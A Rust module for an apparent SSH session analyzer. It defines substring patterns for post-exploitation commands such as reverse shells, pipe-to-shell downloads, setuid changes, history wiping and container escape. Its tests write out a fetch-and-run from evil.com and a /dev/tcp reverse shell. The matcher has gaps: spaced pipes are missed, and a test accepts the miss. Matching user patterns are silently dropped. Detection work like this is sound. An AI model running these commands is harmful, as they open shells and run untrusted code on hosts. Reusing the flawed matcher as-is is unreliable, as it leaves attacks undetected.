/// Return builtin suspicious command patterns for SSH session analysis.
/// These patterns catch common post-exploitation and anti-forensics activity.
pub fn builtin_patterns() -> Vec<&'static str> {
    vec![
        // Remote code execution
        "curl|sh",
        "curl|bash",
        "wget|sh",
        "wget|bash",
        "curl -s|sh",
        "curl -s|bash",
        "wget -q|sh",
        "wget -q|bash",
        // Payload decoding
        "base64 -d",
        "base64 --decode",
        // Reverse shells
        "python -c 'import socket",
        "python3 -c 'import socket",
        "perl -e 'use Socket",
        "ruby -rsocket",
        "bash -i >& /dev/tcp/",
        "nc -e /bin/",
        "ncat -e /bin/",
        "socat exec:",
        "mkfifo /tmp/",
        // Privilege escalation
        "chmod +s ",
        "chmod u+s ",
        "chmod 4755",
        "chmod 4777",
        // Anti-forensics
        "history -c",
        "history -w /dev/null",
        "unset HISTFILE",
        "export HISTSIZE=0",
        "shred ",
        "> ~/.bash_history",
        // Data exfiltration
        "xxd -p|",
        "openssl enc -base64",
        // Persistence
        "crontab -",
        "at -f ",
        // Container escape
        "nsenter --target 1",
        "chroot /host",
    ]
}

/// Check if a command matches any suspicious pattern.
pub fn matches_suspicious_pattern<'a>(cmd: &'a str, extra_patterns: &[String]) -> Option<&'a str> {
    let builtin = builtin_patterns();
    for pattern in &builtin {
        if cmd.contains(pattern) {
            return Some(pattern);
        }
    }
    for pattern in extra_patterns {
        if cmd.contains(pattern.as_str()) {
            // Can't return a reference to the owned string directly,
            // but we can leak it or use a static approach.
            // For simplicity, return a static str from a match.
            return None; // Caller should handle user patterns separately
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_builtin_patterns_not_empty() {
        assert!(!builtin_patterns().is_empty());
    }

    #[test]
    fn test_pattern_matching() {
        assert!(matches_suspicious_pattern("curl -s http://evil.com | bash", &[]).is_none());
        // Exact pattern matches
        assert!(matches_suspicious_pattern("curl -s|bash", &[]).is_some());
        assert!(matches_suspicious_pattern("base64 -d payload.b64", &[]).is_some());
        assert!(matches_suspicious_pattern("chmod +s /tmp/backdoor", &[]).is_some());
        assert!(matches_suspicious_pattern("history -c", &[]).is_some());
        assert!(matches_suspicious_pattern("ls -la /tmp", &[]).is_none());
    }

    #[test]
    fn test_reverse_shell_patterns() {
        assert!(matches_suspicious_pattern(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            &[]
        )
        .is_some());
        assert!(matches_suspicious_pattern(
            "python -c 'import socket,subprocess,os",
            &[]
        )
        .is_some());
    }
}
